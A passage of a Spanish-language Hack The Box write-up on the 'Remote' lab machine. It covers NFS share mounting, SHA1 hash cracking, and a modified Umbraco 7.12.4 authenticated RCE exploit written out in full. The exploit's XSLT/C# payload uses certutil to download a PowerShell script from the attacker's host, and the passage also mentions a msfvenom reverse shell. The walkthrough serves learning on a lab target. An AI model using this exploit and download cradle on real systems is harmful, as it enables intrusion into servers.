<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB-REMOTE" /><meta name="author" content="Christian Gutierrez" /><meta property="og:locale" content="en_US" /><meta name="description" content="Decripción del entorno Atacante" /><meta property="og:description" content="Decripción del entorno Atacante" /><link rel="canonical" href="https://csl-labs.github.io/posts/htb-remote/" /><meta property="og:url" content="https://csl-labs.github.io/posts/htb-remote/" /><meta property="og:site_name" content="CSL" /><meta property="og:image" content="https://csl-labs.github.io/assets/htb/02_remote/portada.PNG" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-20T14:10:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://csl-labs.github.io/assets/htb/02_remote/portada.PNG" /><meta property="twitter:title" content="HTB-REMOTE" /><meta name="twitter:site" content="@CsLcol" /><meta name="twitter:creator" content="@Christian Gutierrez" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"image":"https://csl-labs.github.io/assets/htb/02_remote/portada.PNG","description":"Decripción del entorno Atacante","mainEntityOfPage":{"@type":"WebPage","@id":"https://csl-labs.github.io/posts/htb-remote/"},"@type":"BlogPosting","url":"https://csl-labs.github.io/posts/htb-remote/","headline":"HTB-REMOTE","dateModified":"2020-11-20T14:10:00-05:00","datePublished":"2020-11-20T14:10:00-05:00","author":{"@type":"Person","name":"Christian Gutierrez"},"@context":"https://schema.org"}</script><title>HTB-REMOTE | CSL</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/base/logoCSL.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">CSL</a></div><div class="site-subtitle font-italic">WriteUps, HackTheBox, CTF's, CheatSheet, Wargames & more...</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>NOSOTROS</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/csl-labs" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/CsLcol" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['csl','csl.com.co'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Publicaciones </a> </span> <span>HTB-REMOTE</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Buscador..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB-REMOTE</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Nov 20, 2020, 2:10 PM -0500" > Nov 20, 2020 <i class="unloaded">2020-11-20T14:10:00-05:00</i> </span> by <span class="author"> Christian Gutierrez </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 22, 2020, 2:02 PM -0500" > Nov 22, 2020 <i class="unloaded">2020-11-22T14:02:15-05:00</i> </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/portada.PNG" class="post-preview-img"><h2 id="decripción-del-entorno">Decripción del entorno</h2><h3 id="atacante"><span style="color:green">Atacante</span></h3><div class="table-wrapper"><table><tbody><tr><td>OS<td>Kali Linux<tr><td>IP<td>10.10.14.45</table></div><h3 id="maquina-objetivo"><span style="color:green">Maquina Objetivo</span></h3><div class="table-wrapper"><table><tbody><tr><td>OS<td>Windows<tr><td>IP<td>10.10.10.180<tr><td>Dificultad<td>4.7/10 / <strong>Medium</strong><tr><td>URL<td><a href="https://www.hackthebox.eu/home/machines/profile/234"><strong>Remote</strong></a></table></div><h2 id="enumeración">Enumeración</h2><p>Se realiza la enumeración habitual para el reconocimiento e identificación de los puertos abiertos en el sistema:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oN</span> nmap_remote 10.10.10.180
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/01_escaneo_nmap.png" alt="Escaneo con Nmap" /> <em>Resultado escaneo con nmap</em></p><p>En el puerto 80 se detecta un servicio web en el cual se identifican 2 directorios interesantes:</p><ul><li>/umbraco/<li>/umbraco/webservices/codeEditorSave.asmx</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/02_puerto_80.png" alt="Puerto 80" /> <em>Pagina Web desplegada en el puerto 80</em></p><p>En este punto nos percatamos en 2 servicios interesantes, los cuales son el <strong>FTP (21)</strong> y el <strong>RPC (Remote Procedure Call – 111, 2049)</strong>, por lo cual procedemos a verificarlos:</p><h3 id="ftp">FTP</h3><ul><li>anonymous:anonymous</ul><p>El FTP tiene habilitado el acceso anónimo, pero este no revela ninguna información, así que nos centramos en los otros puertos.</p><h3 id="rpc">RPC</h3><blockquote><p>El <strong>RPC</strong> es un protocolo de computación distribuida que permite ejecutar llamados y acciones sobre otro equipo sin preocuparse en el canal o la comunicación entre los mismos, algo así como un SOCKET a nivel de sistema operativo. Un ejemplo claro de este protocolo lo vemos en las actualizaciones de Windows, en el que nuestro equipo se comunica al servidor principal, y en caso de existir actualizaciones, crea un canal <strong>RPC</strong> a nuestro equipo y ejecuta los comandos y acciones necesarias para aplicar las actualizaciones. Si bien el <strong>RPC</strong> es un protocolo, actualmente esta muy extendido en el uso de aplicaciones cliente – servidor, facilitando notoriamente la interacción sin tener que configurar los canales de comunicación. Es por esto que también se han implementado otro tipo de tecnologías directamente sobre el protocolo, en este caso, es posible montar un sistema de ficheros en red <strong>NFS (Network File System)</strong> y de esta manera compartir información y archivos con otros equipos en la red.</p></blockquote><p>Recordemos que el sistema <strong>NFS</strong> monta sistema de archivos en red que permite que otros equipos interactúen con ese sistema de archivos de forma remota, casi como si los tuvieran montados de manera local. Por todo lo anterior, teniendo habilitado un puerto <strong>RPC</strong> vamos a verificar los procesos y servicios que tiene en ejecución:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>rpcinfo <span class="nt">-p</span> 10.10.10.180
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/03_rcpinfo.png" alt="RCPINFO" /> <em>Validación del protocolo RPC</em></p><p>El comando anterior nos muestra la versión que se esta utilizando, el puerto en el que corre y el servicio que soporta, así pues, confirmamos que existe un servicio <strong>NFS</strong> ejecutandose en el protocolo <strong>RPC</strong>, por el puerto <strong>2049</strong>:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>showmount <span class="nt">-e</span> 10.10.10.180
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/04_showmount.png" alt="ShowMount" /> <em>Verificación del sistema de archivos NFS por ShowMount</em></p><p>Con el comando <code class="language-plaintext highlighter-rouge">showmount</code> podemos verificar qué sistemas de archivos se encuentran disponibles en un servicio <strong>NFS</strong> remoto. En este caso encontramos <code class="language-plaintext highlighter-rouge">/site_backups</code> que tiene permisos <strong>(everyone)</strong>, lo que nos permite montarlo y accederlo sin credenciales:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>mount <span class="nt">-t</span> nfs 10.10.10.180:/site_backups tmp/ <span class="nt">-o</span> nolock
</pre></table></code></div></div><p>En nuestro sistema lo vamos a montar como una “partición/volumen” el recurso <strong>NFS</strong> de <code class="language-plaintext highlighter-rouge">/site_backups</code>, esto lo hacemos con el comando <code class="language-plaintext highlighter-rouge">mount</code> indicándole el tipo de sistema de archivos <code class="language-plaintext highlighter-rouge">-t nfs</code> y asignándole una ruta local en la cual montar el contenido <code class="language-plaintext highlighter-rouge">tmp/</code>. Adicionalmente la opción <code class="language-plaintext highlighter-rouge">-o nolock</code> permite a las aplicaciones bloquear los archivos, pero solo de forma local, por ejemplo, para accederlos mediante un editor.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/05_mount_site_backups.png" alt="moun site_backups" /> <em>Montaje de la particion NFS siteBackups con nuestro equipo atacante</em></p><p>Lo primero que hacemos es descargarnos el archivo <code class="language-plaintext highlighter-rouge">Web.config</code> del directorio principal para poder verificar si existen credenciales en texto claro, pero no es así:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/06_umbraco_sdf.png" alt="moun site_backups" /> <em>Revision archivo Web.Config</em></p><p>Sin embargo, encontramos una cadena de conexión a una base de datos local que se almacena como archivo, llamado <code class="language-plaintext highlighter-rouge">Umbraco.sdf</code></p><ul><li><strong>Nota</strong>:<blockquote><p>Se intenta realizar la búsqueda mediante expresiones regulares de términos referentes a <strong>password</strong>, pero son una gran cantidad de archivos y al ser un <strong>volumen NFS</strong> en un equipo externo por medio de una VPN (hack the box), es demasiado lento y la conexión se cae continuamente, por lo que después de eso, se siguió la pista del <code class="language-plaintext highlighter-rouge">Umbraco.sdf</code></p></blockquote></ul><p>Investigando un poco en internet, se llega a que dicho archivo se almacena en la siguiente ruta:</p><ul><li><code class="language-plaintext highlighter-rouge">/App_Data/Umbraco.sdf</code> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/07_head_umbraco_sdf.png" alt="File Umbraco" /> <em>Revision de Umbraco.sdf</em></ul><p>A primera vista del archivo, se encuentra una posible credencial para el usuario admin de la plataforma, dicha credencial se encuentra hasheada en <strong>SHA1</strong>:</p><ul><li>Administrator<ul><li>Admin<li>admin@htb.local<li>b8be16afba8c314ad33d812f22a04991b90e2aaa</ul></ul><p>Procedemos a realizar un ataque de diccionario utilizando la herramienta <strong>John The Ripper</strong> con el diccionario <strong>rockyou.txt</strong>:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash_admin
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/08_john_the_ripper.png" alt="John The Ripper" /> <em>Ataque por diccionario con John The Ripper</em></p><p>Lo cual nos arroja como contraseña, las siguientes credenciales:</p><ul><li>admin@htb.local:<strong>baconandcheese</strong></ul><p>Estas credenciales nos dan acceso al panel de administración:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/09_umbraco_panel_administracion.png" alt="Panel Umbraco" /> <em>Panel de Administración Umbraco</em></p><p>Con <strong>searchexploit</strong> encontramos un exploit que <strong>requiere de autenticación</strong> para obtener una <strong>ejecución remota de comandos</strong> en sistemas umbraco:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>searchsploit Umbraco
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/10_searchsploit_umbraco.png" alt="Searchsploit" /> <em>Busqueda de exploit’s para el software Umbraco</em></p><p>Inicialmente tenemos identificado el exploit <a href="https://www.exploit-db.com/exploits/46153">Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution</a>:</p><ul><li>exploits/aspx/webapps/46153.py</ul><h2 id="explotación">Explotación</h2><p>Así que le realizamos algunos cambios para que pueda funcionar de forma adecuada, agregamos el target y el payload que queremos:</p><ul><li>Login: admin@htb.local<li>Password: baconandcheese<li>Host: http://10.10.10.180</ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre><td class="rouge-code"><pre><span class="c1"># Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Dork: N/A
# Date: 2019-01-13
# Exploit Author: Gregory DRAPERI &amp; Hugo BOUTINON
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# CVE: N/A
</span>

<span class="kn">import</span> <span class="nn">requests</span><span class="p">;</span>

<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span><span class="p">;</span>

<span class="k">def</span> <span class="nf">print_dict</span><span class="p">(</span><span class="n">dico</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="n">dico</span><span class="p">.</span><span class="n">items</span><span class="p">());</span>
    
<span class="k">print</span><span class="p">(</span><span class="s">"Start"</span><span class="p">);</span>

<span class="c1"># Execute a calc for the PoC
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'&lt;?xml version="1.0"?&gt;&lt;xsl:stylesheet version="1.0" </span><span class="se">\
</span><span class="s">xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" </span><span class="se">\
</span><span class="s">xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"&gt;</span><span class="se">\
</span><span class="s">&lt;msxsl:script language="C#" implements-prefix="csharp_user"&gt;public string xml() </span><span class="se">\
</span><span class="s">{ string cmd = "/c certutil.exe -urlcache -f http://10.10.14.45/d14.ps1 C:</span><span class="se">\\</span><span class="s">site_backups</span><span class="se">\\</span><span class="s">d14.ps1"; System.Diagnostics.Process proc = new System.Diagnostics.Process();</span><span class="se">\
</span><span class="s"> proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;</span><span class="se">\
</span><span class="s"> proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; </span><span class="se">\
</span><span class="s"> proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } </span><span class="se">\
</span><span class="s"> &lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="csharp_user:xml()"/&gt;</span><span class="se">\
</span><span class="s"> &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; '</span><span class="p">;</span>

<span class="n">login</span> <span class="o">=</span> <span class="s">"admin@htb.local"</span><span class="p">;</span>
<span class="n">password</span><span class="o">=</span><span class="s">"baconandcheese"</span><span class="p">;</span>
<span class="n">host</span> <span class="o">=</span> <span class="s">"http://10.10.10.180"</span><span class="p">;</span>

<span class="c1"># Step 1 - Get Main page
</span><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">url_main</span> <span class="o">=</span><span class="n">host</span><span class="o">+</span><span class="s">"/umbraco/"</span><span class="p">;</span>
<span class="n">r1</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_main</span><span class="p">);</span>
<span class="n">print_dict</span><span class="p">(</span><span class="n">r1</span><span class="p">.</span><span class="n">cookies</span><span class="p">);</span>

<span class="c1"># Step 2 - Process Login
</span><span class="n">url_login</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s">"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"</span><span class="p">;</span>
<span class="n">loginfo</span> <span class="o">=</span> <span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">login</span><span class="p">,</span><span class="s">"password"</span><span class="p">:</span><span class="n">password</span><span class="p">};</span>
<span class="n">r2</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_login</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">loginfo</span><span class="p">);</span>

<span class="c1"># Step 3 - Go to vulnerable web page
</span><span class="n">url_xslt</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s">"/umbraco/developer/Xslt/xsltVisualize.aspx"</span><span class="p">;</span>
<span class="n">r3</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">);</span>

<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r3</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">);</span>
<span class="n">VIEWSTATE</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s">"__VIEWSTATE"</span><span class="p">)[</span><span class="s">'value'</span><span class="p">];</span>
<span class="n">VIEWSTATEGENERATOR</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s">"__VIEWSTATEGENERATOR"</span><span class="p">)[</span><span class="s">'value'</span><span class="p">];</span>
<span class="n">UMBXSRFTOKEN</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="s">'UMB-XSRF-TOKEN'</span><span class="p">];</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'UMB-XSRF-TOKEN'</span><span class="p">:</span><span class="n">UMBXSRFTOKEN</span><span class="p">};</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"__EVENTTARGET"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span><span class="s">"__EVENTARGUMENT"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span><span class="s">"__VIEWSTATE"</span><span class="p">:</span><span class="n">VIEWSTATE</span><span class="p">,</span><span class="s">"__VIEWSTATEGENERATOR"</span><span class="p">:</span><span class="n">VIEWSTATEGENERATOR</span><span class="p">,</span><span class="s">"ctl00$body$xsltSelection"</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span><span class="s">"ctl00$body$contentPicker$ContentIdValue"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span><span class="s">"ctl00$body$visualizeDo"</span><span class="p">:</span><span class="s">"Visualize+XSLT"</span><span class="p">};</span>

<span class="c1"># Step 4 - Launch the attack
</span><span class="n">r4</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">);</span>
<span class="k">print</span> <span class="n">r4</span><span class="p">.</span><span class="n">text</span>
<span class="k">print</span><span class="p">(</span><span class="s">"End"</span><span class="p">);</span>
</pre></table></code></div></div><h3 id="exploit">Exploit</h3><p>Analizando el payload original que tiene el exploit, vemos que realiza la ejecución directa de <strong>calc.exe</strong> mediante el llamado de funcionalidades en <strong>C#</strong>, todo esto, embebido en la estructura <strong>XSLT</strong>. Entrando más en detalle con el exploit vemos lo siguiente:</p><ul><li>Crea una sesión con requests (librería de Python) y realiza 4 peticiones al servidor, en este orden:<ol><li><span style="color:red">[GET]</span> Visita la página principal para validar disponibilidad del host.<li><span style="color:green">[POST]</span> Realiza el proceso de login con las credenciales proporcionadas.<li><span style="color:red">[GET]</span> Visita directamente la funcionalidad vulnerable, para capturar las cookies y los datos para saltar el <strong>anti CSRF</strong>: /umbraco/developer/Xslt/xsltVisualize.aspx<li><span style="color:green">[POST]</span> Por último, con los datos recopilados realiza la petición de explotación, la cual incluye el payload en el parámetro: <strong>ctl00$body$xsltSelection</strong> todo lo demás, viene de la petición anterior.</ol><li>El payload consiste en una webshell básica en C#, la cual puede retornar un valor visual conforme al comando ingresado, y depende de 2 valores:<ol><li><strong>FileName</strong> =&gt; Este será el ejecutable a llamar por sistema operativo<li><strong>CMD</strong> =&gt; Estos serán los argumentos pasados al ejecutable seleccionado.</ol></ul><p>Con todo lo anterior, podemos comprobar que al ingresar los siguientes valores en el payload, obtenemos un resultado de ejecución remota de comandos:</p><ul><li><code class="language-plaintext highlighter-rouge">FileName = “cmd.exe”</code><li><code class="language-plaintext highlighter-rouge">Cmd: “/c whoami”</code> Como respuesta a la petición obtenemos la información del comando ejecutado.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/11_test_exploit.png" alt="Test Exploit" /> <em>Prueba manual del exploit</em></p><ul><li>Nota<blockquote><p>Al ser un sistema Windows, lo primero que intentamos es realizar el consumo de un ejecutable (Shell reversa construida con msfvenom) de forma remota mediante <strong>SMB</strong> hacia nuestro servidor (consideramos que la Shell esta en C# y hay que escapar la barra invertida), quedando así: \\10.10.14.45\share\d14.exe, sin embargo, no obtenemos resultado debido a 